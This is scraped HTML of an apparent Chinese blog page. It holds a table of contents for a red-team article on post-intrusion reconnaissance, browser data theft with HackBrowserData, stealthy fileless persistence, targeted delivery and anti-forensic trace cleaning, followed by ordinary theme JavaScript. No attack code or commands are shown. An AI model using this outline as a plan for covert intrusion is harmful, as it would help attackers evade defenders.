href="#%E5%9F%BA%E4%BA%8E%E7%BB%84%E7%BB%87%E6%9E%B6%E6%9E%84%E7%9A%84%E8%BD%BB%E9%87%8F%E6%9E%9A%E4%B8%BE-%E4%B8%80%E6%9D%A1%E5%91%BD%E4%BB%A4%E4%B8%80%E6%89%B9%E4%BF%A1%E6%81%AF"><span class="toc-text">基于组织架构的轻量枚举 - 一条命令一批信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%8E%B0%E6%9C%89%E2%80%9D%E5%8F%AF%E8%A7%81%E9%9D%A2%E2%80%9D%E6%90%9C%E9%9B%86%E5%86%85%E9%83%A8%E4%BF%A1%E6%81%AF"><span class="toc-text">利用现有”可见面”搜集内部信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E7%BB%93%E6%9E%84%E6%83%85%E6%8A%A5%EF%BC%88%E7%BB%84%E7%BB%87%E3%80%81%E4%BA%BA%E3%80%81%E6%9D%83%E9%99%90%E4%B8%89%E4%BD%8D%E4%B8%80%E4%BD%93%EF%BC%89"><span class="toc-text">域结构情报（组织、人、权限三位一体）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%88%E5%AF%BC%E5%87%BA%E5%85%B3%E7%B3%BB-%E6%9C%AC%E5%9C%B0%E5%88%86%E6%9E%90%EF%BC%89"><span class="toc-text">权限链分析（导出关系 本地分析）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%85%B3%E9%94%AE%E4%BA%BA%E5%91%98%E8%AF%86%E5%88%AB%EF%BC%9A%E4%BB%A5%E4%BA%BA%E4%B8%BA%E6%A0%B8%E5%BF%83%E5%BB%BA%E7%AB%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%A7%86%E8%A7%92"><span class="toc-text">二、关键人员识别：以人为核心建立信息收集视角</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E7%AD%96%E7%95%A5"><span class="toc-text">典型策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%AD%E6%8D%AE%E7%9B%B8%E5%85%B3%EF%BC%88%E4%B8%8D%E6%98%AFmimikatz%EF%BC%8C%E8%80%8C%E6%98%AF%E9%9D%99%E6%80%81-%E8%A1%8C%E4%B8%BA%E6%8E%A8%E6%BC%94%EF%BC%89"><span class="toc-text">凭据相关（不是mimikatz，而是静态&#x2F;行为推演）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%B8%9A%E5%8A%A1%E7%B3%BB%E7%BB%9F%E6%98%A0%E5%B0%84%EF%BC%9A%E4%BB%8E%E8%B5%84%E4%BA%A7%E5%AE%9A%E4%BD%8D%E5%88%B0%E4%B8%9A%E5%8A%A1%E7%90%86%E8%A7%A3"><span class="toc-text">三、业务系统映射：从资产定位到业务理解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5%E6%83%85%E6%8A%A5%EF%BC%88%E7%9C%8B%E7%AD%96%E7%95%A5%EF%BC%8C%E7%9C%8B%E8%B0%81%E8%A2%AB%E7%AE%A1%EF%BC%89"><span class="toc-text">组策略情报（看策略，看谁被管）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E8%B5%84%E4%BA%A7%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%AE%9A%E4%BD%8D%EF%BC%88%E4%B8%8D%E6%98%AF%E6%89%AB%EF%BC%8C%E6%98%AF%E8%AF%BB%EF%BC%89"><span class="toc-text">关键资产与服务定位（不是扫，是读）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E8%A6%81%E8%B5%84%E4%BA%A7%E5%AE%9A%E4%BD%8D%E6%96%B9%E6%B3%95%E8%AE%BA%EF%BC%88%E4%B8%8D%E9%9D%A0%E6%89%AB%E6%8F%8F%E9%9D%A0%E6%8E%A8%E6%BC%94%EF%BC%89"><span class="toc-text">重要资产定位方法论（不靠扫描靠推演）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E7%BB%84%E7%BB%87%E7%BB%93%E6%9E%84%E5%81%9A%E6%8E%A8%E6%BC%94"><span class="toc-text">基于组织结构做推演</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%93%E5%90%88%E7%BA%BF%E7%B4%A2%E6%9E%84%E5%BB%BA%E7%9B%AE%E6%A0%87%E8%B5%84%E4%BA%A7%E4%BC%98%E5%85%88%E7%BA%A7"><span class="toc-text">结合线索构建目标资产优先级</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%95%B0%E6%8D%AE%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90%EF%BC%9A%E4%B8%BB%E5%8A%A8%E2%80%9D%E5%90%AC%E4%BA%BA%E8%AF%B4%E8%AF%9D%E2%80%9D"><span class="toc-text">四、数据流向分析：主动”听人说话”</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97-%E6%96%87%E4%BB%B6%E7%97%95%E8%BF%B9"><span class="toc-text">事件日志 + 文件痕迹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%B1%E5%85%A5%E7%94%A8%E6%88%B7%E6%9C%AC%E8%BA%AB%EF%BC%9A%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90"><span class="toc-text">深入用户本身：浏览器数据与用户行为分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HackBrowserData"><span class="toc-text">HackBrowserData</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90"><span class="toc-text">用户行为分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E9%9A%90%E8%94%BD%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-text">五、隐蔽持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%81%E4%B9%85%E5%8C%96%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B9%9F%E5%BA%94%E8%B4%B4%E8%BF%91%E4%B8%9A%E5%8A%A1%E6%B5%81%EF%BC%8C%E4%B8%8D%E5%88%B6%E9%80%A0%E5%BC%82%E5%B8%B8%E6%B5%81%E9%87%8F"><span class="toc-text">持久化与横向移动也应贴近业务流，不制造异常流量</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%80%9D%E8%B7%AF-%E6%96%87%E4%BB%B6%E4%B8%8D%E8%90%BD%E5%9C%B0%E7%9A%84%E7%AE%80%E5%8D%95%E9%9A%90%E8%94%BD%E6%89%93%E6%B3%95"><span class="toc-text">常规思路&amp;文件不落地的简单隐蔽打法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9C%9F%E6%AD%A3%E7%9A%84%E9%9A%90%E8%94%BD%E6%96%B9%E6%A1%88"><span class="toc-text">真正的隐蔽方案</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E8%94%BD%E6%80%A7%E6%8F%90%E5%8D%87%E7%AD%96%E7%95%A5"><span class="toc-text">隐蔽性提升策略</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84%E8%A7%84%E5%88%92%EF%BC%9A%E6%83%85%E6%8A%A5%E8%9E%8D%E5%90%88%E4%B8%8E%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84%E8%A7%84%E5%88%92"><span class="toc-text">六、攻击路径规划：情报融合与攻击路径规划</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E4%BB%B7%E5%80%BC%E8%AF%84%E4%BC%B0%E7%9F%A9%E9%98%B5"><span class="toc-text">用户价值评估矩阵</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%83%85%E6%8A%A5%E7%9A%84%E7%B2%BE%E5%87%86%E6%8A%95%E9%80%92"><span class="toc-text">基于情报的精准投递</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%81%E4%B9%85%E5%8C%96%E7%AD%96%E7%95%A5%E7%9A%84%E4%B8%9A%E5%8A%A1%E5%8C%96%E4%BC%AA%E8%A3%85"><span class="toc-text">持久化策略的业务化伪装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E6%BA%AF%E6%BA%90%E4%B8%8E%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="toc-text">反溯源与痕迹清理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E4%BD%93%E7%AD%96%E7%95%A5%E5%B0%8F%E7%BB%93"><span class="toc-text">整体策略小结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-text">结语</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M8 10.5h8M8 14h5.5M17 3.338A9.95 9.95 0 0 0 12 2C6.477 2 2 6.477 2 12c0 1.6.376 3.112 1.043 4.453c.178.356.237.763.134 1.148l-.595 2.226a1.3 1.3 0 0 0 1.591 1.592l2.226-.596a1.63 1.63 0 0 1 1.149.133A9.96 9.96 0 0 0 12 22c5.523 0 10-4.477 10-10c0-1.821-.487-3.53-1.338-5"/></svg><span>参与讨论</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js`,
+    marked: `https://cdn.jsdelivr.net/npm/marked@13.0.1/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+  <script type="module">
+  const el = document.querySelector('#comments #beaudar');
+  util.viewportLazyload(el, load_beaudar, false);
+
+  function load_beaudar() {
+    if (!el) return;
+    try {
+      el.innerHTML = '';
+    } catch (error) {
+      console.error(error);
+    }
+    const script = document.createElement('script');
+    script.src = 'https://beaudar.lipk.org/client.js';
+    script.async = true;
+    for (const key of Object.keys(el.attributes)) {
+      const attr = el.attributes[key];
+      if (['class', 'id'].includes(attr.name) === false) {
+        script.setAttribute(attr.name, attr.value);
+      }
+    }
+    el.appendChild(script);
+  }
+</script>
+
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
